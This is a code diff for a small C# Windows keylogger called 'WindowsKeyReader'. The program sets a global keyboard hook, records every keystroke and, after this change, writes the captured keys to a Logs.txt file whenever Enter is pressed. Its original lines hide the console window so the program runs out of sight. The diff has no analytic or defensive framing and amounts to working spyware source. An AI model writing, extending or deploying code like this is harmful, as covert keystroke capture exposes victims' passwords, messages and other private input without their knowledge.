@@ -30,7 +30,7 @@ namespace WindowsKeyReader
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
+           // ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
             hook = SetHook(proc);
             Application.Run();
             UnhookWindowsHookEx(hook);
@@ -89,7 +89,7 @@ namespace WindowsKeyReader
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
 
-
+            
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -103,11 +103,13 @@ namespace WindowsKeyReader
                     else if (Convert.ToString((Keys)vkCode).ToUpper() == "RETURN")
                     {
                         logs += "\n";
-
+                        writetolog(logs);
+                        logs = "";
                     }
                     else
                     {
                         logs = logs + ((Keys)vkCode).ToString();
+                        
                     }
 
                     //MessageBox.Show(logs);
@@ -115,16 +117,16 @@ namespace WindowsKeyReader
                 }
                 catch { }
                 ////////////////////////////////////////////////////////////////
-                //Console.WriteLine((Keys)vkCode);
+                Console.WriteLine((Keys)vkCode);
             }
            
             return CallNextHookEx(hook, nCode, wParam, lParam);
         }
 
-        public void writetolog()
+        public static void writetolog(string log)
         {
-            StreamWriter writer = new StreamWriter("C:\\Logs.txt");
-            writer.WriteLine(logs);
+            StreamWriter writer = new StreamWriter(Application.StartupPath+"//Logs.txt",true);
+            writer.WriteLine(log);
             writer.Close();
 
         }
